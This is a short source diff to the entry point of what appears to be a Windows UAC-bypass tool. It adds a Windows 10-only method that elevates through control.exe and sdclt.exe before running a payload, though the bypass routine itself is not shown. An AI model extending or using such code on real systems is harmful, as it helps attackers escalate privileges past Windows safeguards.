@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     2.58
+*  VERSION:     2.59
 *
-*  DATE:        13 Mar 2017
+*  DATE:        15 Mar 2017
 *
 *  Program entry point.
 *
@@ -583,6 +583,16 @@ UINT ucmMain()
                 return ERROR_UNSUPPORTED_TYPE;
         }
         break;
+
+    case UacMethodEnigma0x3_3:
+#ifndef _DEBUG
+        if (g_ctx.dwBuildNumber < 10240) {
+            ucmShowMessage(WIN10ONLY);
+            return ERROR_UNSUPPORTED_TYPE;
+        }
+#endif
+        break;
+
     }
 
     //prepare command for payload
@@ -880,6 +890,11 @@ UINT ucmMain()
         }
         break;
 
+    case UacMethodEnigma0x3_3:
+        if ( ucmAppPathMethod(  (paramLen != 0) ? szBuffer : NULL, CONTROL_EXE, SDCLT_EXE) ) {
+            return ERROR_SUCCESS;
+        }
+        break;
     }
 
     return ERROR_ACCESS_DENIED;
